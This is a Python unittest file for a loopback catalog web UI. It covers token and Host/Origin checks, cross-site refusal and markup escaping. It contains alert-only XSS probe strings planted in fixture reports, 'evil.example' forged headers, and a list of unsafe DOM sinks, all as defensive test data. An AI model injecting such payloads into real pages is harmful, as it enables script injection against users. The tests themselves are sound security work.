"""Catalog web page and terminal menu: loopback server guards, API round trip, markup safety, menu smoke.

Offline: a local file:// git fixture food and an imported report folder. The
server is started in-process on 127.0.0.1 and spoken to with http.client.
"""
from contextlib import redirect_stderr, redirect_stdout
import http.client
import io
import json
import os
from pathlib import Path
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
import catalog  # noqa: E402
import catalog_ui_server as ui  # noqa: E402
import oaw  # noqa: E402
import oaw_status  # noqa: E402

GIT = shutil.which("git")
UI = ROOT / "scripts" / "catalog_ui"
MIT = b"MIT License\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\n"
HOSTILE = "<script>alert(1)</script> & <img src=x onerror=alert(2)> <svg onload=alert(3)>"
# An arXiv OAI-PMH arXivRaw answer, written by hand from the documented shape (tests never reach arXiv).
ARXIV_RAW = ('<?xml version="1.0" encoding="UTF-8"?><OAI-PMH xmlns="http://www.openarchives.org/OAI/2.0/"><GetRecord><record><metadata>'
             '<arXivRaw xmlns="http://arxiv.org/OAI/arXivRaw/"><id>2606.03979</id>'
             '<version version="v1"><date>Tue, 2 Jun 2026 17:59:59 GMT</date></version>'
             '<version version="v2"><date>Fri, 10 Jul 2026 09:00:00 GMT</date></version>'
             "<title>Language Models Need Sleep: Learning to Self-Modify and Consolidate Memories</title>"
             "<authors>Ali Behrouz, Farnoosh Hashemi, Adel Javanmard, Vahab Mirrokni</authors>"
             "<license>http://creativecommons.org/licenses/by/4.0/</license><abstract>Wake and sleep.</abstract>"
             "</arXivRaw></metadata></record></GetRecord></OAI-PMH>").encode("utf-8")


def skill_md(name):
    return (f"---\nname: {name}\ndescription: Keep decision notes with sources.\n---\n\n# {name}\n\n"
            "Write one note per decision and cite the source file.\n").encode()


class UiCase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.template_dir = tempfile.TemporaryDirectory(prefix="oaw-ui-template-")
        cls.template = Path(cls.template_dir.name).resolve() / "project"
        oaw.apply_plan(oaw.plan_install(cls.template, "minimal", False), migrate=False)

    @classmethod
    def tearDownClass(cls):
        cls.template_dir.cleanup()

    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory(prefix="oaw-ui-")
        self.addCleanup(self.temporary.cleanup)
        self.base = Path(self.temporary.name).resolve()
        self.project = self.base / "project"
        shutil.copytree(self.template, self.project)
        environment = patch.dict(os.environ, {"OAW_LAB_HOME": str(self.base / "lab")})
        environment.start()
        self.addCleanup(environment.stop)
        self.codes = []
        terminal = patch.object(catalog, "terminal_write", side_effect=self.terminal)
        terminal.start()
        self.addCleanup(terminal.stop)

    def terminal(self, text):
        self.codes.append(re.search(r": (\d{6})\n", text).group(1))
        return True

    def pass_ab(self, food="sweet-notes", *components):
        """A consented live behavior A/B with a gain and a parity floor (D17); no v0 runner writes one."""
        record = {"schema_version": 1, "evidence_id": f"{food}/T3a/ab", "food": food, "provenance": "runner-live", "mode": "live",
                  "level": "measured", "bundle_sha256": "1" * 64, "consent_id": "c-test", "result": "gain", "integration": "clear",
                  "parity": "parity", "components": list(components or [f"skill:{food}"])}
        catalog.save_evidence(self.project, food, "T3a-ab.json", record)
        catalog.refresh_view(self.project)

    # ---------------------------------------------------------------- fixtures

    def make_food(self, name="sweet-notes", extra=None):
        repo = self.base / "sources" / name
        files = {f"skills/{name}/SKILL.md": skill_md(name), "LICENSE": MIT, "README.md": b"# Notes\n", **(extra or {})}
        for relative, data in files.items():
            path = repo / relative
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(data)
        hooks = self.base / "no-hooks"
        hooks.mkdir(exist_ok=True)
        for args in (["init", "-q"], ["add", "-A"], ["commit", "-qm", "fixture"]):
            subprocess.run([GIT, "-c", "user.name=fixture", "-c", "user.email=fixture@example.invalid", "-c", "core.autocrlf=false",
                            "-c", f"core.hooksPath={hooks}", "-c", "init.defaultBranch=main", *args],
                           cwd=repo, check=True, capture_output=True)
        return repo

    def hostile_report(self):
        """An Elephant/Goldfish folder whose free text tries to be markup."""
        folder = self.base / "report"
        folder.mkdir()
        (folder / "scout.json").write_text(json.dumps({"repo": "example/hostile-food"}), encoding="utf-8")
        (folder / "digest.json").write_text(json.dumps({"integration_mode": "absorb_method", "what_it_does": HOSTILE,
                                                        "gates": [{"gate": "<b>license</b>", "verdict": "pass"}]}), encoding="utf-8")
        (folder / "goldfish-1.json").write_text(json.dumps({"reviewer": "<i>fish</i>", "verdict_summary": HOSTILE,
                                                            "findings": [{"severity": "major"}]}), encoding="utf-8")
        (folder / "components.json").write_text(json.dumps({"components": [
            {"id": "evil-part", "name": HOSTILE, "disposition": "absorb", "reason": HOSTILE, "oaw_target": "oaw-evidence"}]}),
            encoding="utf-8")
        (folder / "proposals.md").write_text("# <h1>Proposal</h1>\n", encoding="utf-8")
        return folder

    def imported_food(self):
        """A food registered offline by importing a record (it waits at 入口 for its taste)."""
        catalog.cmd_import_report(self.project, "", str(self.hostile_report()))
        catalog.refresh_view(self.project)
        return "hostile-food"

    def ask(self, **body):
        status, headers, raw = self.request("POST", ui.QUESTION_PATH, body)
        return status, headers, raw

    # ---------------------------------------------------------------- server

    def start(self, **kwargs):
        with redirect_stderr(io.StringIO()):
            server = ui.start_server(self.project, auto_effect=kwargs.pop("auto_effect", False), **kwargs)
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        self.server, self.port, self.token = server, server.server_address[1], server.app.token
        return server

    def request(self, method, path, body=None, *, token=True, host=None, headers=None):
        connection = http.client.HTTPConnection("127.0.0.1", self.port, timeout=30)
        self.addCleanup(connection.close)
        sent = {"Host": host or f"127.0.0.1:{self.port}"}
        if token:
            sent[ui.TOKEN_HEADER] = self.token if token is True else token
        data = None
        if body is not None:
            data = body if isinstance(body, bytes) else json.dumps(body).encode("utf-8")
            sent["Content-Type"] = "application/json"
        sent.update(headers or {})
        connection.request(method, path, body=data, headers=sent)
        response = connection.getresponse()
        raw = response.read()
        return response.status, dict(response.getheaders()), raw

    def api(self, path):
        status, _headers, raw = self.request("GET", path)
        self.assertEqual(status, 200, raw)
        return json.loads(raw)

    def action(self, name, params=None, *, expect_ok=True):
        status, _headers, raw = self.request("POST", "/api/action/" + name, params or {})
        self.assertIn(status, (200, 202), raw)
        job = json.loads(raw)["job"]
        deadline = time.monotonic() + 120
        while job["state"] == "running":
            self.assertLess(time.monotonic(), deadline, "job did not finish")
            time.sleep(0.1)
            job = self.api("/api/job/" + job["id"])["job"]
        envelope = job["result"]
        if expect_ok:
            self.assertTrue(envelope["ok"], envelope)
        return envelope


class ServerGuardTests(UiCase):
    def test_server_binds_loopback_on_a_free_port_with_a_session_token(self):
        server = self.start()
        self.assertEqual(server.server_address[0], "127.0.0.1")
        self.assertNotEqual(self.port, 0)
        self.assertGreaterEqual(len(self.token), 32)
        self.assertEqual(server.url, f"http://127.0.0.1:{self.port}/#t={self.token}")
        other = ui.UiServer(ui.UiApp(self.project, "x" * 40), 0)
        self.addCleanup(other.server_close)
        self.assertEqual(other.server_address[0], "127.0.0.1")
        self.assertNotEqual(other.server_address[1], self.port)

    def test_api_refuses_missing_or_wrong_token_and_foreign_host(self):
        self.start()
        for kwargs in ({"token": False}, {"token": "wrong-" + "x" * 40}, {"token": self.token[:-1]},
                       {"host": "evil.example"}, {"host": f"evil.example:{self.port}"}, {"host": f"127.0.0.1:{self.port + 1}"}):
            status, headers, raw = self.request("GET", "/api/view", **kwargs)
            self.assertEqual(status, 403, kwargs)
            self.assertNotIn("Access-Control-Allow-Origin", headers)
            self.assertNotIn(b"my_oaw", raw)
        status, _headers, _raw = self.request("GET", "/", token=False, host="evil.example")
        self.assertEqual(status, 403)
        status, headers, raw = self.request("GET", "/", token=False)
        self.assertEqual(status, 200)
        self.assertIn("script-src 'self'", headers["Content-Security-Policy"])
        self.assertEqual(headers["X-Frame-Options"], "DENY")
        self.assertIn(b"app.js", raw)
        status, _headers, raw = self.request("GET", "/api/meta")
        self.assertEqual(status, 200)
        self.assertEqual(json.loads(raw)["paid_runs_enabled"], False)

    def test_actions_refuse_a_missing_or_wrong_token(self):
        self.start()
        for token in (False, "wrong-" + "x" * 40, self.token[:-1]):
            for name in ("view", "feed", "policy-set", "remove"):
                status, headers, _raw = self.request("POST", "/api/action/" + name, {"urls": ["a/b"], "name": "egm", "apply": True}, token=token)
                self.assertEqual(status, 403, (name, token))
                self.assertNotIn("Access-Control-Allow-Origin", headers)
        self.assertEqual(self.server.app.jobs, {})

    def test_actions_are_json_posts_only_and_cross_site_requests_are_refused(self):
        self.start()
        self.assertEqual(self.request("GET", "/api/action/view")[0], 405)
        status, headers, _raw = self.request("OPTIONS", "/api/action/view", headers={"Origin": "http://evil.example",
                                                                                   "Access-Control-Request-Method": "POST"})
        self.assertEqual(status, 405)
        self.assertNotIn("Access-Control-Allow-Origin", headers)
        self.assertEqual(self.request("POST", "/api/action/view", b"{}", headers={"Content-Type": "text/plain"})[0], 415)
        self.assertEqual(self.request("POST", "/api/action/view", {}, headers={"Origin": "http://evil.example"})[0], 403)
        self.assertEqual(self.request("POST", "/api/action/view", {}, headers={"Sec-Fetch-Site": "cross-site"})[0], 403)
        self.assertEqual(self.request("POST", "/api/action/nope", {})[0], 404)
        self.assertEqual(self.request("POST", "/api/action/view", b"[1]")[0], 400)
        self.assertEqual(self.request("POST", "/api/action/view", b"{}", headers={"Content-Length": str(ui.MAX_BODY + 1)})[0], 413)
        self.assertEqual(self.request("POST", "/api/view", {})[0], 405)
        self.assertEqual(self.request("DELETE", "/api/view")[0], 405)
        status, _headers, raw = self.request("POST", "/api/action/view", {}, headers={"Origin": f"http://127.0.0.1:{self.port}",
                                                                                    "Sec-Fetch-Site": "same-origin"})
        self.assertIn(status, (200, 202), raw)

    def test_one_action_at_a_time_and_engine_bugs_stay_inside_the_envelope(self):
        self.start()
        gate = threading.Event()

        def slow(target, params, progress):
            progress("waiting", 1, 2)
            gate.wait(20)
            return {"status": "slow", "lines": []}

        def broken(target, params, progress):
            raise RuntimeError("secret detail C:\\Users\\someone")
        with patch.dict(ui.ACTIONS, {"view": slow, "builds": broken}):
            status, _headers, raw = self.request("POST", "/api/action/view", {})
            self.assertEqual(status, 202)
            job = json.loads(raw)["job"]
            self.assertEqual(job["progress"], {"label": "waiting", "done": 1, "total": 2})
            status, _headers, raw = self.request("POST", "/api/action/builds", {})
            self.assertEqual(status, 409)
            self.assertEqual(self.api("/api/view")["busy"]["id"], job["id"])
            gate.set()
            deadline = time.monotonic() + 20
            while self.api("/api/job/" + job["id"])["job"]["state"] == "running":
                self.assertLess(time.monotonic(), deadline)
                time.sleep(0.05)
            with redirect_stderr(io.StringIO()):
                envelope = self.action("builds", expect_ok=False)
        self.assertEqual((envelope["code"], envelope["error"]), (2, "internal error: RuntimeError"))
        self.assertEqual(self.request("GET", "/api/meta")[0], 200)

    def test_bad_parameters_are_refused_before_the_engine_runs(self):
        self.start()
        for name, params in (("absorb", {"food": "x", "components": "not-a-list"}), ("absorb", {"food": "x", "components": ["a"], "apply": "yes"}),
                             ("policy-set", {"per_food_tokens": "1", "weekly_tokens": 2, "sandbox": ["no-api-keys"]}),
                             ("policy-set", {"per_food_tokens": 1, "weekly_tokens": 2, "sandbox": ["no-api-keys"], "confirm": "12ab"}),
                             ("triage", {"food": "x", "flag": "f", "outcome": "trust-me", "reason": "r"}), ("feed", {"urls": []})):
            envelope = self.action(name, params, expect_ok=False)
            self.assertEqual(envelope["code"], 2, (name, params))

    def test_served_page_carries_the_tract_renderer(self):
        self.start()
        status, _headers, raw = self.request("GET", "/", token=False)
        self.assertEqual(status, 200)
        for marker in ('<svg id="tract"', 'id="pick"', 'id="detail"', 'id="feed"', "<title>OAW 消化道</title>"):
            self.assertIn(marker, raw.decode("utf-8"))
        status, headers, raw = self.request("GET", "/app.js", token=False)
        self.assertEqual((status, headers["Content-Type"]), (200, "text/javascript; charset=utf-8"))
        script = raw.decode("utf-8")
        for needle in ("function drawTract(table, foods)", "function bolusOf(table, food, index)", "function tractShape(narrow, count)",
                       "function drawStop(", "function drawExits(", "function blockerBox(", "function askBox(", "wall.getTotalLength()",
                       "document.createElementNS(SVG_NS, tag)"):
            self.assertIn(needle, script)
        status, _headers, raw = self.request("GET", "/style.css", token=False)
        css = raw.decode("utf-8")
        for needle in (".tract-svg .wave", ".bolus .badge.owner circle { fill: var(--you); }", ".bolus .badge.optional circle { fill: var(--plan); }",
                       '@media (prefers-color-scheme: dark)', ':root[data-theme="dark"]'):
            self.assertIn(needle, css)
        self.assertEqual(self.api("/api/meta")["question_chars"], catalog.QUESTION_CHARS)
        payload = self.api("/api/view")
        # Every stop the page draws takes its organ caption from view.json (catalog_core.PIPELINE_ORGANS_ZH).
        self.assertEqual([s["organ_zh"] for s in payload["view"]["pipeline"]["stages"]],
                         ["口", "食道", "胃", "十二指腸", "肝", "小腸", "大腸", "門靜脈", "全身"])
        self.assertEqual(payload["questions"], [])

    def test_questions_need_the_token_and_land_in_the_project(self):
        self.start()
        food = self.imported_food()
        body = {"food": food, "stage": "intake", "question": "這個卡點是什麼意思？"}
        path = self.project / ".oaw/catalog/questions.jsonl"
        for kwargs in ({"token": False}, {"token": "wrong-" + "x" * 40}, {"token": self.token[:-1]}, {"host": "evil.example"},
                       {"headers": {"Origin": "http://evil.example"}}, {"headers": {"Sec-Fetch-Site": "cross-site"}}):
            status, headers, _raw = self.request("POST", ui.QUESTION_PATH, body, **kwargs)
            self.assertEqual(status, 403, kwargs)
            self.assertNotIn("Access-Control-Allow-Origin", headers)
        self.assertFalse(path.exists())
        self.assertEqual(self.request("GET", ui.QUESTION_PATH)[0], 405)
        self.assertEqual(self.request("POST", ui.QUESTION_PATH, json.dumps(body).encode(), headers={"Content-Type": "text/plain"})[0], 415)
        self.assertFalse(path.exists())
        status, _headers, raw = self.ask(**body)
        self.assertEqual(status, 200, raw)
        answer = json.loads(raw)
        record = answer["question"]
        self.assertEqual({k: record[k] for k in ("food", "stage", "question", "status")},
                         {"food": food, "stage": "intake", "question": "這個卡點是什麼意思？", "status": "open"})
        self.assertRegex(record["time"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")
        self.assertEqual(answer["path"], ".oaw/catalog/questions.jsonl")
        self.assertEqual([json.loads(line) for line in path.read_text(encoding="utf-8").splitlines()], [record])
        # Raw catalog state stays on this machine: the catalog's .gitignore does not let questions be committed.
        ignore = (self.project / ".oaw/catalog/.gitignore").read_text(encoding="utf-8")
        self.assertIn("*\n", ignore)
        self.assertNotIn("questions", ignore)
        # The brief carries the food's facts, ready to paste into the conversation.
        for needle in ("食物：example/hostile-food（hostile-food，repo）", "卡在哪：入口：還沒送去試吃", "依據：D4：", "你不處理會怎樣：",
                       "問題：這個卡點是什麼意思？"):
            self.assertIn(needle, answer["brief"])
        self.assertEqual([q["id"] for q in self.api("/api/view")["questions"]], [record["id"]])
        self.assertEqual(self.server.app.jobs, {})  # recording a question runs no engine action
        self.assertEqual(catalog.cmd_questions(self.project)["open"], 1)

    def test_questions_are_capped_and_sanitized(self):
        self.start()
        food = self.imported_food()

        def refused(**body):
            status, _headers, raw = self.ask(**{"food": food, "stage": "intake", "question": "ok", **body})
            self.assertEqual(status, 400, raw)
            return json.loads(raw)["error_zh"]
        self.assertEqual(refused(question="x" * (catalog.QUESTION_CHARS + 1)), "問題太長：最多 500 字。")
        self.assertEqual(refused(question=" \u200b\u202e\u0007 "), "問題是空的：先寫下你想問什麼。")
        self.assertEqual(refused(question=["not", "text"]), "要寫明哪樣食物、哪一站和問題的文字。")
        self.assertEqual(refused(stage="warp-speed"), "沒有這一站。")
        self.assertEqual(refused(food="nobody"), "找不到這樣食物。")
        status, _headers, _raw = self.request("POST", ui.QUESTION_PATH, b"{}", headers={"Content-Length": str(ui.MAX_QUESTION_BODY + 1)})
        self.assertEqual(status, 413)
        self.assertFalse((self.project / ".oaw/catalog/questions.jsonl").exists())
        hostile = "<b>why</b>\u202e\u0007 & <img src=x onerror=alert(1)>\n\nnext"
        status, _headers, raw = self.ask(food=food, stage="intake", question=hostile)
        self.assertEqual(status, 200, raw)
        for byte in (b"<", b">", b"&"):
            self.assertNotIn(byte, raw)
        self.assertEqual(json.loads(raw)["question"]["question"], "<b>why</b> & <img src=x onerror=alert(1)> next")
        stored = json.loads((self.project / ".oaw/catalog/questions.jsonl").read_text(encoding="utf-8"))
        self.assertEqual(stored["question"], "<b>why</b> & <img src=x onerror=alert(1)> next")


class NamingTests(unittest.TestCase):
    def test_the_web_command_is_ui_with_no_old_alias(self):
        args = catalog.parser().parse_args(["ui", "--no-browser", "--port", "0"])
        self.assertEqual((args.command, args.no_browser, args.port), ("ui", True, 0))
        for old in ("play",):
            with redirect_stderr(io.StringIO()), self.assertRaises(SystemExit):
                catalog.parser().parse_args([old])
        self.assertFalse((ROOT / "scripts" / "catalog_play.py").exists())
        self.assertTrue(callable(ui.cmd_ui))


class PipelinePageTests(unittest.TestCase):
    """D19: the main screen is the intake pipeline, operable on the animation, with no game wording."""

    GAME = re.compile(r"(?i)\bgames?\b|\bgaming\b|\bplay(?:s|ed|er|ers|ing)?\b|玩|遊戲|關卡")

    def test_page_files_carry_no_game_wording(self):
        for name in ("index.html", "app.js", "style.css"):
            self.assertIsNone(self.GAME.search((UI / name).read_text(encoding="utf-8")), name)
        for script in ("catalog.py", "catalog_core.py", "catalog_ui_server.py", "oaw_status.py"):
            self.assertIsNone(self.GAME.search((ROOT / "scripts" / script).read_text(encoding="utf-8")), script)
        # D19 governs command/page/document naming. D38 permits game-making as a capability
        # discussed in the SOP; a blanket ban over every document body contradicts that purpose.
        for doc in ("docs/SKILL_INTAKE.md", "docs/CLI_Reference.md", "CHANGELOG.md", "README.md", "README.zh.md"):
            self.assertIsNone(self.GAME.search(Path(doc).stem), doc)
            self.assertIsNone(self.doc_branding((ROOT / doc).read_text(encoding="utf-8")), doc)
        self.assertIsNone(self.GAME.search("display: grid; replay; playbook; 關口"))  # unrelated words are not caught
        self.assertIsNotNone(self.GAME.search("固定關卡"))  # a game "level" is caught

    @classmethod
    def doc_branding(cls, text):
        title = re.search(r"^#\s+(.+)$", text, re.MULTILINE)
        return cls.GAME.search(title.group(1)) if title else None

    def test_game_making_capability_is_not_catalog_branding(self):
        self.assertIsNone(self.doc_branding("# OAW skill intake\n能力型可選用遊戲製作 skill。\n"))
        self.assertIsNotNone(self.doc_branding("# OAW Game\nSkill intake.\n"))
        self.assertIsNotNone(self.doc_branding("# OAW 遊戲\n技能管理。\n"))

    def test_the_tract_is_the_main_screen_with_two_inlets(self):
        """D23: one digestive tract across the top, the food picker, then the selected food beside the two inlets."""
        page = (UI / "index.html").read_text(encoding="utf-8")
        for later in ('id="pick"', 'id="detail"', 'id="feed"', 'id="my-oaw"'):
            self.assertLess(page.index('id="pipeline"'), page.index(later))
        self.assertLess(page.index('id="detail"'), page.index('id="my-oaw"'))
        for marker in ('id="inlet-scout"', "每週偵查 → 相關性過濾 → 你確認", 'id="inlet-named"', "你點名", '<svg id="tract"',
                       'id="pipe-empty"', 'id="legend"', 'id="pipe-tools"', "<title>OAW 消化道</title>"):
            self.assertIn(marker, page)
        script = (UI / "app.js").read_text(encoding="utf-8")
        # The stage table, organ captions included, comes from view.json; the page has no stage list of its own.
        self.assertIn("S.view && S.view.pipeline", script)
        self.assertIn("txt(stage.organ_zh, 6)", script)
        for name in ("入口", "封存", "盲審", "核准", "口", "食道", "十二指腸", "門靜脈", "全身"):
            self.assertNotIn(f"'{name}'", script)
        # The two inlets are drawn into the mouth and open their forms.
        self.assertIn("{ id: 'inlet-scout', tag: 'A 每週偵查'", script)
        self.assertIn("{ id: 'inlet-named', tag: 'B 你點名'", script)

    def test_moves_glide_along_the_tube_and_respect_reduced_motion(self):
        css = (UI / "style.css").read_text(encoding="utf-8")
        self.assertRegex(css, r"\.tract-svg \.wave \{[^}]*animation: peristalsis")
        self.assertRegex(css, r"\.bolus \.ring\.spin \{[^}]*animation: spin")
        self.assertRegex(css, r"\.bob \{ animation: bob")
        reduced = css[css.index("@media (prefers-reduced-motion: reduce)"):]
        self.assertIn("*, *::before, *::after { animation: none !important; transition: none !important; }", reduced)
        self.assertIn(".tract-svg .wave, .bolus .ring.spin, .bob, .seg.st-current { animation: none !important; }", reduced)
        script = (UI / "app.js").read_text(encoding="utf-8")
        self.assertIn("matchMedia('(prefers-reduced-motion: reduce)')", script)
        # A bolus whose stop changed glides along the tube; with reduced motion it simply appears there.
        self.assertIn("if (!before.size || reducedMotion()) return;", script)
        self.assertIn("const p = wall.getPointAtLength(from + (to - from) * eased);", script)
        self.assertIn("behavior: reducedMotion() ? 'auto' : 'smooth'", script)

    def test_planned_stages_draw_no_button_and_actions_call_existing_endpoints(self):
        script = (UI / "app.js").read_text(encoding="utf-8")
        self.assertIn("(stageIsPlanned(stage) ? '' : stageButtons(stage))", script)
        self.assertIn("if (!stage || stageIsPlanned(stage) || bolus.running) return box;", script)
        # Owner codes stay on the terminal: a terminal action is text on the page, never a button.
        self.assertIn("if (action.where === 'terminal') {", script)
        core = catalog.core
        for spec in core.PIPELINE_ACTIONS.values():
            self.assertIn(spec["endpoint"], ui.ACTIONS)
        planned = [s for s in core.PIPELINE_STAGES if s["automation"] == "planned"]
        self.assertEqual({s["id"] for s in planned}, {"review"})  # D28: Claude's tastings make 實測 mixed
        self.assertTrue(all(not s["actions"] for s in planned))
        for flow in ("tasteFlow(food)", "forgetFlow(food)", "absorbChoose(food)", "removeFlow(food.id, food)", "restoreFlow({ name: params.build })"):
            self.assertIn(flow, script)

    # ---- review regressions on the page (D19)

    def test_a_running_taste_never_sends_the_bolus_back_to_an_older_view(self):
        script = (UI / "app.js").read_text(encoding="utf-8")
        follow = script[script.index("async function follow("):script.index("async function settle(")]
        # Only a non-null live stage replaces the last one; the live stage is cleared after the final view loads.
        self.assertIn("if (live && JSON.stringify(live) !== JSON.stringify(S.live)) {", follow)
        self.assertNotIn("S.live = null", follow)
        self.assertIn("S.live = null;\n    await refresh(true);", script)
        self.assertEqual(script.count("await settle();"), 2)
        # Glides go forward; a backward glide needs the engine's own stage to have changed.
        self.assertIn("if (back && from.engine === to.engine) continue;", script)
        # The bolus, the picker and the progress bar take their stop from the same place.
        self.assertIn("stage: hereOf(table, food), running: running,", script)
        self.assertIn("const here = bolus.stage;", script)

    def test_the_feed_result_does_not_borrow_the_inlet_connector_class(self):
        script = (UI / "app.js").read_text(encoding="utf-8")
        css = (UI / "style.css").read_text(encoding="utf-8")
        self.assertIn("class: 'feed-merge'", script)
        self.assertNotIn("class: 'merge'", script)
        self.assertIn(".feed-lines .feed-merge {", css)
        self.assertNotIn(".feed-lines .merge", css)

    def test_narrow_screens_get_the_tall_tract_without_sideways_scroll(self):
        script = (UI / "app.js").read_text(encoding="utf-8")
        css = (UI / "style.css").read_text(encoding="utf-8")
        # Below 620 px the tract is one wavy column; with no food it still draws every stop and one sentence.
        self.assertIn("const narrow = (box.parentNode.clientWidth || 1000) < 620;", script)
        self.assertIn("return { kind: 'tall', w: 360,", script)
        self.assertIn("drawTract(table, foods);", script)
        self.assertIn("empty.textContent = foods.length ? '' : txt(table.empty_zh, 200);", script)
        # Every stop names its organ and whether it is automated, owner, mixed or planned.
        self.assertIn("`${txt(stage.organ_zh, 6)} · ${automationName(table, stage.automation)}`", script)
        self.assertIn(".tract-svg { display: block; width: 100%; height: auto; }", css)
        self.assertIn(".detail-grid { display: grid; gap: 16px; grid-template-columns: minmax(0, 1fr);", css)
        phone = css[css.index("@media (max-width: 560px)"):]
        phone = phone[:phone.index("\n}\n")]
        self.assertIn(".explain dl { grid-template-columns: minmax(0, 1fr); gap: 2px; }", phone)
        self.assertIn("overflow-x: hidden;", css)
        # Keyboard: a bolus is a focusable button with a visible focus ring; Enter or Space selects it.
        self.assertIn("tabindex: 0, role: 'button', 'aria-pressed': String(selected)", script)
        self.assertIn("if (e.key === 'Enter' || e.key === ' ') {", script)
        self.assertIn(".bolus:focus-visible .body { stroke: var(--you); stroke-width: 4; }", css)

    def test_toast_colour_follows_the_worst_tasted_verdict(self):
        script = (UI / "app.js").read_text(encoding="utf-8")
        tone = script[script.index("function feedTone(r) {"):]
        tone = tone[:tone.index("\n  }\n")]
        self.assertIn("families.every((f) => f === 'good')", tone)
        self.assertIn("'amber'", tone)
        self.assertIn("toast(parts.join(' · '), feedTone(r));", script)

    def test_terminal_steps_show_a_full_command_and_page_wording_is_clear(self):
        script = (UI / "app.js").read_text(encoding="utf-8")
        self.assertIn("S.meta && S.meta.menu_command", script)
        self.assertIn("navigator.clipboard.writeText(command)", script)
        self.assertIn("🐟 Goldfish 報告（匯入；零脈絡未驗證）", script)
        self.assertNotIn("（零脈絡盲審）", script)
        self.assertNotIn("OWNER_CONFIRMS", script)
        for name in ("app.js", "index.html"):
            self.assertNotIn("排掉（忘掉）", (UI / name).read_text(encoding="utf-8"))
        for script_name in ("catalog_core.py", "catalog_ui_server.py", "oaw_status.py", "catalog.py"):
            self.assertNotIn("排掉（忘掉）", (ROOT / "scripts" / script_name).read_text(encoding="utf-8"), script_name)
        self.assertEqual(catalog.core.PIPELINE_ACTIONS["forget"]["label_zh"], "忘掉這樣食物")
        command = ui.menu_command(Path("/projects/demo"))
        self.assertRegex(command, r'^python3? ".+catalog\.py" menu --target ".+demo"$')

    def test_blocker_and_ask_boxes_show_view_data_only(self):
        script = (UI / "app.js").read_text(encoding="utf-8")
        blocker = script[script.index("function blockerBox("):script.index("function currentActions(")]
        for needle in ("(food.pipeline || {}).blocker", "blocker.where_zh", "blocker.basis_zh", "blocker.if_ignored_zh", "blocker.unknown_zh",
                       "'卡在哪'", "'依據'", "'你不處理會怎樣'", "'紀錄沒寫的'", "'紀錄裡沒有寫'"):
            self.assertIn(needle, blocker)
        asking = script[script.index("function askBox("):script.index("function splitBar(")]
        for needle in ("api('/api/question', { food: food.id, stage: stage, question: question })", "已記下，Claude 會在對話裡回答",
                       "copyText(last.brief, pre, '已複製：貼到和 Claude 的對話裡。')", "maxlength: String(limit)",
                       "S.questions.filter((q) => q.food === food.id)"):
            self.assertIn(needle, asking)
        presets = re.search(r"const PRESET_QUESTIONS = \[([^\]]*)\];", script).group(1)
        self.assertEqual(re.findall(r"'([^']+)'", presets), ["這個卡點是什麼意思？", "不處理會怎樣？", "你建議怎麼做？為什麼？"])
        self.assertIn("await navigator.clipboard.writeText(text);", script)
        # The page has no model of its own: it never calls one and never claims to answer.
        for word in ("window.claude", "sample(", "思考中"):
            self.assertNotIn(word, script)


class MarkupSafetyTests(UiCase):
    def test_food_strings_are_escaped_in_api_payloads_and_never_markup(self):
        self.start()
        folder = self.hostile_report()
        envelope = self.action("import-report", {"food": "", "directory": str(folder)})
        self.assertEqual(envelope["result"]["food"], "hostile-food")
        for path in ("/api/view", "/api/job/" + self.server.app.current.id):
            status, headers, raw = self.request("GET", path)
            self.assertEqual(status, 200)
            self.assertTrue(headers["Content-Type"].startswith("application/json"))
            self.assertEqual(headers["X-Content-Type-Options"], "nosniff")
            for byte in (b"<", b">", b"&"):
                self.assertNotIn(byte, raw, path)
        view = self.api("/api/view")["view"]
        food = next(f for f in view["foods"] if f["id"] == "hostile-food")
        report = food["historical"][0]
        self.assertEqual(report["level"], "historical-prior")
        self.assertIn("<script>alert(1)</script>", report["elephant"]["what_it_does"])
        self.assertIn("<img src=x onerror=alert(2)>", report["goldfish"][0]["summary"])
        self.assertEqual(food["verdict"]["headline"], "untested")
        self.assertEqual(ui.encode_json({"a": "<\u2028>"}), b'{"a":"\\u003c\\u2028\\u003e"}')

    def test_page_sets_text_only_and_loads_nothing_external(self):
        script = (UI / "app.js").read_text(encoding="utf-8")
        for sink in ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "eval(", "new Function", "srcdoc",
                     "createContextualFragment", "DOMParser", ".src =", "href", "<img", "<svg", "setAttribute('style"):
            self.assertNotIn(sink, script)
        self.assertIn("textContent", script)
        for name in ("index.html", "app.js", "style.css"):
            text = (UI / name).read_text(encoding="utf-8")
            # The SVG namespace is an identifier for createElementNS, never fetched.
            self.assertNotRegex(text, r"(?i)https?://(?!github\.com/owner/repo|www\.w3\.org/2000/svg')|//cdn|@import|url\(")
        self.assertEqual(script.count("http://"), 1)
        self.assertIn("const SVG_NS = 'http://www.w3.org/2000/svg';", script)
        self.assertIn("document.createElementNS(SVG_NS, tag)", script)
        page = (UI / "index.html").read_text(encoding="utf-8")
        self.assertEqual(re.findall(r'<script[^>]*src="([^"]+)"', page), ["app.js"])
        self.assertEqual(re.findall(r'<link[^>]*href="([^"]+)"', page), ["style.css"])
        self.assertNotRegex(page, r"<script>[^<]")
        self.assertIn('lang="zh-Hant"', page)
        css = (UI / "style.css").read_text(encoding="utf-8")
        self.assertIn("prefers-color-scheme: dark", css)
        self.assertIn("prefers-reduced-motion", css)

    def test_display_rules_never_claim_improvement_without_measured_evidence(self):
        self.assertEqual(oaw_status.quality_label({"level": "static-measured", "note": "enhanced", "value": "nutritious"}), "未量測")
        self.assertEqual(oaw_status.quality_label({"level": "not-measured", "note": "enhanced"}), "未量測")
        self.assertEqual(oaw_status.quality_label({"level": "measured", "note": "enhanced", "value": "nutritious"}), "加強（實測）")
        self.assertNotIn("加強", oaw_status.quality_label({"level": "measured", "note": "no improvement claimed", "value": "no gain"}))
        script = (UI / "app.js").read_text(encoding="utf-8")
        self.assertIn("if (!line || line.level !== 'measured') return '未量測';", script)
        self.assertEqual(oaw_status.headline_label({"headline": "delicious"}), "未知（delicious，請更新 OAW）")
        self.assertEqual(oaw_status.level_label("historical-prior"), "歷史證據")


@unittest.skipUnless(GIT, "git is required for local fixture repositories")
